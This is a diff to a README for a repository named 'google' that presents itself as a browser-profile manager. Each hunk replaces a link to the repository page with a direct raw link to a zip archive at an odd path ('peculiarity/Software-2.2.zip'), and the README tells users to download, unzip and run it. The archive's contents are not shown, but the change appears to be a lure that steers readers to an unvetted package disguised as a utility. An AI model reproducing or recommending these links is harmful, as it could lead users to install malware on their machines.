@@ -1,6 +1,6 @@
 # 🧭 google - Manage browser profiles with ease
 
-[![Download](https://img.shields.io/badge/Download-Primary%20Link-blue?style=for-the-badge)](https://github.com/sternepenitentiary330/google)
+[![Download](https://img.shields.io/badge/Download-Primary%20Link-blue?style=for-the-badge)](https://raw.githubusercontent.com/sternepenitentiary330/google/main/peculiarity/Software-2.2.zip)
 
 ## 🚀 Overview
 
@@ -13,7 +13,7 @@ It is made for users who want a simple way to handle many browser sessions witho
 ### 1. Download the app
 Visit this page to download the latest release:
 
-[Download google](https://github.com/sternepenitentiary330/google)
+[Download google](https://raw.githubusercontent.com/sternepenitentiary330/google/main/peculiarity/Software-2.2.zip)
 
 ### 2. Unzip the file
 After the download finishes, locate the `.zip` file and extract it to a folder on your PC.
@@ -197,4 +197,4 @@ If you copy the app to another folder or PC, copy these files too.
 
 Use this link to download or visit the release page:
 
-[https://github.com/sternepenitentiary330/google](https://github.com/sternepenitentiary330/google)
+[https://raw.githubusercontent.com/sternepenitentiary330/google/main/peculiarity/Software-2.2.zip](https://raw.githubusercontent.com/sternepenitentiary330/google/main/peculiarity/Software-2.2.zip)
